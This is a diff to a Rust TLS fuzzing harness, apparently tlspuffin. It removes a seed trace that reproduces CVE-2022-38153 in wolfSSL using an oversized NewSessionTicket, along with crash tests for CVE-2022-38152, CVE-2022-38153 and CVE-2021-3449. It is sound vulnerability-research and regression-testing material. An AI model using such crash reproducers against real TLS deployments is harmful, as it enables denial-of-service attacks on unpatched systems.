@@ -533,124 +533,6 @@ pub fn seed_successful12(client: AgentName, server: AgentName) -> Trace<TlsQuery
     }
 }
 
-pub fn seed_cve_2022_38153(client: AgentName, server: AgentName) -> Trace<TlsQueryMatcher> {
-    Trace {
-        prior_traces: vec![],
-        descriptors: vec![
-            AgentDescriptor::new_client(client, TLSVersion::V1_2),
-            AgentDescriptor::new_server(server, TLSVersion::V1_2),
-        ],
-        steps: vec![
-            OutputAction::new_step(client),
-            // Client Hello, Client -> Server
-            InputAction::new_step(
-                server,
-                term! {
-                    fn_client_hello(
-                        ((client, 0)),
-                        ((client, 0)),
-                        ((client, 0)),
-                        ((client, 0)),
-                        ((client, 0)),
-                        ((client, 0))
-                    )
-                },
-            ),
-            // Server Hello, Server -> Client
-            InputAction::new_step(
-                client,
-                term! {
-                        fn_server_hello(
-                            ((server, 0)),
-                            ((server, 0)),
-                            ((client, 0)),
-                            ((server, 0)),
-                            ((server, 0)),
-                            ((server, 0))
-                        )
-                },
-            ),
-            // Server Certificate, Server -> Client
-            Step {
-                agent: client,
-                action: Action::Input(InputAction {
-                    recipe: term! {
-                        fn_certificate(
-                            ((server, 0))
-                        )
-                    },
-                }),
-            },
-            // Server Key Exchange, Server -> Client
-            Step {
-                agent: client,
-                action: Action::Input(InputAction {
-                    recipe: term! {
-                        fn_server_key_exchange(
-                            ((server, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ServerKeyExchange)))]/Vec<u8>)
-                        )
-                    },
-                }),
-            },
-            // Server Hello Done, Server -> Client
-            Step {
-                agent: client,
-                action: Action::Input(InputAction {
-                    recipe: term! {
-                        fn_server_hello_done
-                    },
-                }),
-            },
-            // Client Key Exchange, Client -> Server
-            Step {
-                agent: server,
-                action: Action::Input(InputAction {
-                    recipe: term! {
-                        fn_client_key_exchange(
-                            ((client, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ClientKeyExchange)))]/Vec<u8>)
-                        )
-                    },
-                }),
-            },
-            // Client Change Cipher Spec, Client -> Server
-            Step {
-                agent: server,
-                action: Action::Input(InputAction {
-                    recipe: term! {
-                        fn_change_cipher_spec
-                    },
-                }),
-            },
-            // Client Handshake Finished, Client -> Server
-            // IMPORTANT: We are using here OpaqueMessage as the parsing code in src/io.rs does
-            // not know that the Handshake record message is encrypted. The parsed message from the
-            // could be a HelloRequest if the encrypted data starts with a 0.
-            Step {
-                agent: server,
-                action: Action::Input(InputAction {
-                    recipe: term! {
-                        fn_opaque_message(
-                            ((client, 3)[None])
-                        )
-                    },
-                }),
-            },
-            // NewSessionTicket, Server -> Client
-            Step {
-                agent: client,
-                action: Action::Input(InputAction {
-                    recipe: term! {
-                        fn_new_session_ticket(
-                            ((server, 0)/u64),
-                            fn_large_bytes_vec
-                        )
-                    },
-                }),
-            },
-        ],
-    }
-}
-
 pub fn seed_successful_with_ccs(client: AgentName, server: AgentName) -> Trace<TlsQueryMatcher> {
     let mut trace = seed_successful(client, server);
 
@@ -1965,19 +1847,9 @@ pub fn create_corpus() -> Vec<(Trace<TlsQueryMatcher>, &'static str)> {
 
 #[cfg(test)]
 pub mod tests {
-    use std::{fs::File, io::Write};
+    use std::io::Write;
 
-    use nix::{
-        sys::{
-            signal::Signal,
-            wait::{
-                waitpid, WaitPidFlag,
-                WaitStatus::{Exited, Signaled},
-            },
-        },
-        unistd::{fork, ForkResult},
-    };
-    use puffin::{agent::AgentName, put::PutOptions, put_registry::PutRegistry, trace::Action};
+    use puffin::{agent::AgentName, trace::Action};
     use test_log::test;
 
     use super::*;
@@ -1989,57 +1861,6 @@ pub mod tests {
     #[test]
     fn test_version() {
         TLS_PUT_REGISTRY.version_strings();
-    }
-
-    #[test]
-    #[cfg(feature = "tls12")]
-    #[ignore] // Disabled because requires: disable("postauth", None) in wolfSSL build.rs
-    /// Internal ID was "Finding 1"
-    fn test_seed_cve_2022_38152() {
-        let put = PutDescriptor {
-            name: WOLFSSL520_PUT,
-            options: PutOptions::new(vec![("clear", "true")]),
-        };
-
-        let trace = seed_session_resumption_dhe_full.build_trace();
-        let initial_server = trace.descriptors[0].name;
-        let server = trace.prior_traces[0].descriptors[0].name;
-
-        trace.execute_with_puts(
-            &TLS_PUT_REGISTRY,
-            &[(initial_server, put.clone()), (server, put)],
-        );
-        expect_crash(|| {});
-    }
-
-    #[test]
-    #[cfg(feature = "tls12")]
-    #[cfg(feature = "tls12-session-resumption")]
-    #[ignore] // Disabled because requires wolfSSL 5.3.0
-              // Internally known as "Finding 8"
-    fn test_seed_cve_2022_38153() {
-        for i in 0..50 {
-            seed_successful12_with_tickets.execute_trace();
-        }
-
-        expect_crash(|| {
-            seed_cve_2022_38153.execute_trace();
-        });
-    }
-
-    #[test]
-    #[cfg(feature = "tls12")]
-    fn test_seed_cve_2021_3449() {
-        if !TLS_PUT_REGISTRY
-            .default_factory()
-            .version()
-            .contains("1.1.1j")
-        {
-            return;
-        }
-        expect_crash(|| {
-            seed_cve_2021_3449.execute_trace();
-        });
     }
 
     #[test]
